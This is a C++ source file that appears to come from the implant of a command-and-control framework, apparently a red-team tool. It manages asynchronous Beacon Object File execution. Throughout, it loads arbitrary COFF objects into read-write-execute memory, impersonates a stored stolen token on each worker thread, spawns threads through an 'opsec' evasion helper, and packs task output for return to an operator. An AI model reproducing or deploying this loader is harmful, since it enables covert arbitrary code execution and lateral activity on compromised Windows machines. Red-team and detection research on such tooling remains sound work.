#include "Boffer.h"
#include "bof_loader.h"
#include "OpsecThread.h"
#include "utils.h"
#include <new>

Boffer* g_AsyncBofManager = NULL;

extern HANDLE g_StoredToken;

Boffer* Boffer_Create()
{
	Boffer* self = (Boffer*)MemAllocLocal(sizeof(Boffer));
	new (&self->asyncBofs) Vector<AsyncBofContext*>();
	self->wakeupEvent = NULL;
	return self;
}

void Boffer_Destroy(Boffer* self)
{
	if (!self)
		return;
	if (self->wakeupEvent) {
		ApiNt->NtClose(self->wakeupEvent);
		self->wakeupEvent = NULL;
	}
	ApiWin->DeleteCriticalSection(&self->managerLock);
	self->asyncBofs.destroy();
	self->asyncBofs.~Vector<AsyncBofContext*>();
	MemFreeLocal((LPVOID*)&self, sizeof(Boffer));
}

BOOL Boffer_Initialize(Boffer* self)
{
    self->wakeupEvent = ApiWin->CreateEventA(NULL, TRUE, FALSE, NULL);
    if (!self->wakeupEvent)
        return FALSE;
    
    ApiWin->InitializeCriticalSection(&self->managerLock);
    return TRUE;
}

AsyncBofContext* Boffer_CreateAsyncBof(Boffer* self, ULONG taskId, CHAR* entryName, BYTE* coffFile, ULONG coffFileSize, BYTE* args, ULONG argsSize)
{
    AsyncBofContext* ctx = (AsyncBofContext*)MemAllocLocal(sizeof(AsyncBofContext));
    if (!ctx)
        return NULL;
    
    memset(ctx, 0, sizeof(AsyncBofContext));
    
    ctx->taskId = taskId;
    ctx->state = ASYNC_BOF_STATE_PENDING;
    
    ctx->coffFile = (BYTE*)MemAllocLocal(coffFileSize);
    if (!ctx->coffFile) {
        MemFreeLocal((LPVOID*)&ctx, sizeof(AsyncBofContext));
        return NULL;
    }
    memcpy(ctx->coffFile, coffFile, coffFileSize);
    ctx->coffFileSize = coffFileSize;
    
    if (args && argsSize > 0) {
        ctx->args = (BYTE*)MemAllocLocal(argsSize);
        if (!ctx->args) {
            MemFreeLocal((LPVOID*)&ctx->coffFile, coffFileSize);
            MemFreeLocal((LPVOID*)&ctx, sizeof(AsyncBofContext));
            return NULL;
        }
        memcpy(ctx->args, args, argsSize);
        ctx->argsSize = argsSize;
    }
    
    ULONG entryLen = StrLenA(entryName) + 1;
    ctx->entryName = (CHAR*)MemAllocLocal(entryLen);
    if (!ctx->entryName) {
        if (ctx->args)
            MemFreeLocal((LPVOID*)&ctx->args, argsSize);
        MemFreeLocal((LPVOID*)&ctx->coffFile, coffFileSize);
        MemFreeLocal((LPVOID*)&ctx, sizeof(AsyncBofContext));
        return NULL;
    }
    memcpy(ctx->entryName, entryName, entryLen);
    
    ctx->hStopEvent = ApiWin->CreateEventA(NULL, TRUE, FALSE, NULL);
    if (!ctx->hStopEvent) {
        MemFreeLocal((LPVOID*)&ctx->entryName, entryLen);
        if (ctx->args)
            MemFreeLocal((LPVOID*)&ctx->args, argsSize);
        MemFreeLocal((LPVOID*)&ctx->coffFile, coffFileSize);
        MemFreeLocal((LPVOID*)&ctx, sizeof(AsyncBofContext));
        return NULL;
    }
    
    ApiWin->InitializeCriticalSection(&ctx->outputLock);
    ctx->outputBuffer = Packer_Create();
    
    return ctx;
}

DWORD WINAPI AsyncBofThreadProc(LPVOID lpParameter)
{
    AsyncBofContext* ctx = (AsyncBofContext*)lpParameter;
    if (!ctx)
        return 1;
    
    if (g_StoredToken)
        ApiWin->ImpersonateLoggedOnUser(g_StoredToken);
    
    ctx->state = ASYNC_BOF_STATE_RUNNING;
    
    COF_HEADER* pHeader = (COF_HEADER*)ctx->coffFile;
    COF_SYMBOL* pSymbolTable = (COF_SYMBOL*)(ctx->coffFile + pHeader->PointerToSymbolTable);
    
    BOOL result = AllocateSections(ctx->coffFile, pHeader, ctx->mapSections);
    if (!result) {
        ctx->state = ASYNC_BOF_STATE_FINISHED;
        return 1;
    }
    
    ctx->mapFunctions = (LPVOID*)ApiWin->VirtualAlloc(NULL, MAP_FUNCTIONS_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!ctx->mapFunctions) {
        CleanupSections(ctx->mapSections, MAX_SECTIONS);
        ctx->state = ASYNC_BOF_STATE_FINISHED;
        return 1;
    }
    
    result = ProcessRelocations(ctx->coffFile, pHeader, ctx->mapSections, pSymbolTable, ctx->mapFunctions);
    if (!result) {
        ApiWin->VirtualFree(ctx->mapFunctions, 0, MEM_RELEASE);
        ctx->mapFunctions = NULL;
        CleanupSections(ctx->mapSections, MAX_SECTIONS);
        ctx->state = ASYNC_BOF_STATE_FINISHED;
        return 1;
    }
    
    ApiWin->EnterCriticalSection(&ctx->outputLock);
    Packer_Pack32(ctx->outputBuffer, ctx->taskId);
    Packer_Pack32(ctx->outputBuffer, 50);  // COMMAND_EXEC_BOF
    Packer_Pack8(ctx->outputBuffer, TRUE);
    ApiWin->LeaveCriticalSection(&ctx->outputLock);

    CHAR* entryFuncName = PrepareEntryName(ctx->entryName);
    if (entryFuncName) { 
        ExecuteProc(entryFuncName, ctx->args, ctx->argsSize, pSymbolTable, pHeader, ctx->mapSections);
        FreeFunctionName(entryFuncName);
    }
    
    if (ctx->mapFunctions) {
        ApiWin->VirtualFree(ctx->mapFunctions, 0, MEM_RELEASE);
        ctx->mapFunctions = NULL;
    }
    CleanupSections(ctx->mapSections, MAX_SECTIONS);

    ApiWin->EnterCriticalSection(&ctx->outputLock); 
    Packer_Pack32(ctx->outputBuffer, ctx->taskId);
    Packer_Pack32(ctx->outputBuffer, 50);  // COMMAND_EXEC_BOF
    Packer_Pack8(ctx->outputBuffer, FALSE);
    ApiWin->LeaveCriticalSection(&ctx->outputLock);

    ctx->state = ASYNC_BOF_STATE_FINISHED;
    
    if (g_AsyncBofManager)
        Boffer_SignalWakeup(g_AsyncBofManager);
    
    return 0;
}

BOOL Boffer_StartAsyncBof(Boffer* self, AsyncBofContext* ctx)
{
    if (!ctx)
        return FALSE;
    
    ApiWin->EnterCriticalSection(&self->managerLock);
    
    ctx->hThread = Opsec_CreateAsyncBofThread(AsyncBofThreadProc, ctx, &ctx->threadId);
    if (!ctx->hThread) {
        ApiWin->LeaveCriticalSection(&self->managerLock);
        return FALSE;
    }
    
    self->asyncBofs.push_back(ctx);
    
    ApiWin->LeaveCriticalSection(&self->managerLock);
    return TRUE;
}

BOOL Boffer_StopAsyncBof(Boffer* self, ULONG taskId)
{
    HANDLE hThread = NULL;
    BOOL   found = FALSE;

    ApiWin->EnterCriticalSection(&self->managerLock);
    
    for (size_t i = 0; i < self->asyncBofs.size(); i++) {
        if (self->asyncBofs[i]->taskId == taskId) {
            AsyncBofContext* ctx = self->asyncBofs[i];
            found = TRUE;
            if (ctx->state == ASYNC_BOF_STATE_RUNNING) {
                if (ctx->hStopEvent)
                    ApiWin->SetEvent(ctx->hStopEvent);
                hThread = ctx->hThread;
            }
            ctx->state = ASYNC_BOF_STATE_STOPPED;
            break;
        }
    }
    
    ApiWin->LeaveCriticalSection(&self->managerLock);

    if (!found)
        return FALSE;

    if (hThread) {
        DWORD waitResult = ApiWin->WaitForSingleObject(hThread, 3000);
        if (waitResult == WAIT_TIMEOUT)
            ApiNt->NtTerminateThread(hThread, 0);
    }

    return TRUE;
}

void Boffer_ProcessAsyncBofs(Boffer* self, Packer* outPacker)
{
    if (!outPacker || self->asyncBofs.size() == 0)
        return;
    
    ApiWin->EnterCriticalSection(&self->managerLock);
    
    for (size_t i = 0; i < self->asyncBofs.size(); i++) {
        AsyncBofContext* ctx = self->asyncBofs[i];
        
        BOOL threadAlive = FALSE;
        if (ctx->hThread) {
            DWORD exitCode = 0;
            ApiWin->GetExitCodeThread(ctx->hThread, &exitCode);
            threadAlive = (exitCode == STILL_ACTIVE);
        }
        
        if (threadAlive) {
            if (ApiWin->TryEnterCriticalSection(&ctx->outputLock)) {
                if (ctx->outputBuffer && Packer_datasize(ctx->outputBuffer) > 0) {
                    Packer_PackFlatBytes(outPacker, Packer_data(ctx->outputBuffer), Packer_datasize(ctx->outputBuffer));
                    Packer_Clear(ctx->outputBuffer, TRUE);
                }
                ApiWin->LeaveCriticalSection(&ctx->outputLock);
            }
        } else {
            if (ctx->outputBuffer && Packer_datasize(ctx->outputBuffer) > 0) {
                Packer_PackFlatBytes(outPacker, Packer_data(ctx->outputBuffer), Packer_datasize(ctx->outputBuffer));
                Packer_Clear(ctx->outputBuffer, TRUE);
            }
            if (ctx->state == ASYNC_BOF_STATE_RUNNING)
                ctx->state = ASYNC_BOF_STATE_FINISHED;
        }
    }
    
    ApiWin->LeaveCriticalSection(&self->managerLock);
    
    Boffer_CleanupFinishedBofs(self);
}

void Boffer_CleanupFinishedBofs(Boffer* self)
{
    Vector<AsyncBofContext*> pending;

    ApiWin->EnterCriticalSection(&self->managerLock);
    
    for (size_t i = 0; i < self->asyncBofs.size(); i++) {
        AsyncBofContext* ctx = self->asyncBofs[i];
        if (ctx->state == ASYNC_BOF_STATE_FINISHED || ctx->state == ASYNC_BOF_STATE_STOPPED) {
            pending.push_back(ctx);
            self->asyncBofs.remove(i);
            --i;
        }
    }
    
    ApiWin->LeaveCriticalSection(&self->managerLock);

    for (size_t i = 0; i < pending.size(); i++)
        Boffer_CleanupBofContext(self, pending[i]);

    pending.destroy();
}

void Boffer_CleanupBofContext(Boffer* self, AsyncBofContext* ctx)
{
    if (!ctx)
        return;
    
    if (ctx->hThread) {
        ApiWin->WaitForSingleObject(ctx->hThread, 5000);
        DWORD exitCode = 0;
        ApiWin->GetExitCodeThread(ctx->hThread, &exitCode);
        if (exitCode == STILL_ACTIVE)
            ApiNt->NtTerminateThread(ctx->hThread, 0);
        ApiNt->NtClose(ctx->hThread);
        ctx->hThread = NULL;
    }
    
    if (ctx->hStopEvent) {
        ApiNt->NtClose(ctx->hStopEvent);
        ctx->hStopEvent = NULL;
    }
    
    if (ctx->mapFunctions) {
        ApiWin->VirtualFree(ctx->mapFunctions, 0, MEM_RELEASE);
        ctx->mapFunctions = NULL;
    }
    CleanupSections(ctx->mapSections, MAX_SECTIONS);
    
    if (ctx->coffFile)
        MemFreeLocal((LPVOID*)&ctx->coffFile, ctx->coffFileSize);
    
    if (ctx->args)
        MemFreeLocal((LPVOID*)&ctx->args, ctx->argsSize);
    
    if (ctx->entryName)
        MemFreeLocal((LPVOID*)&ctx->entryName, StrLenA(ctx->entryName) + 1);

    ApiWin->DeleteCriticalSection(&ctx->outputLock);
    
    if (ctx->outputBuffer) {
        Packer_Destroy(ctx->outputBuffer);
        ctx->outputBuffer = NULL;
    }
    
    MemFreeLocal((LPVOID*)&ctx, sizeof(AsyncBofContext));
}

AsyncBofContext* Boffer_FindBofByThreadId(Boffer* self, DWORD threadId)
{
    ApiWin->EnterCriticalSection(&self->managerLock);
    
    AsyncBofContext* result = NULL;
    for (size_t i = 0; i < self->asyncBofs.size(); i++) {
        if (self->asyncBofs[i]->threadId == threadId) {
            result = self->asyncBofs[i];
            break;
        }
    }
    
    ApiWin->LeaveCriticalSection(&self->managerLock);
    return result;
}

AsyncBofContext* Boffer_GetCurrentAsyncBofContext(void)
{
	if (!g_AsyncBofManager || !ApiWin || !ApiWin->GetCurrentThreadId)
		return NULL;
	return Boffer_FindBofByThreadId(g_AsyncBofManager, ApiWin->GetCurrentThreadId());
}

HANDLE Boffer_GetWakeupEvent(Boffer* self)
{
    return self->wakeupEvent;
}

void Boffer_SignalWakeup(Boffer* self)
{
    if (self->wakeupEvent)
        ApiWin->SetEvent(self->wakeupEvent);
}
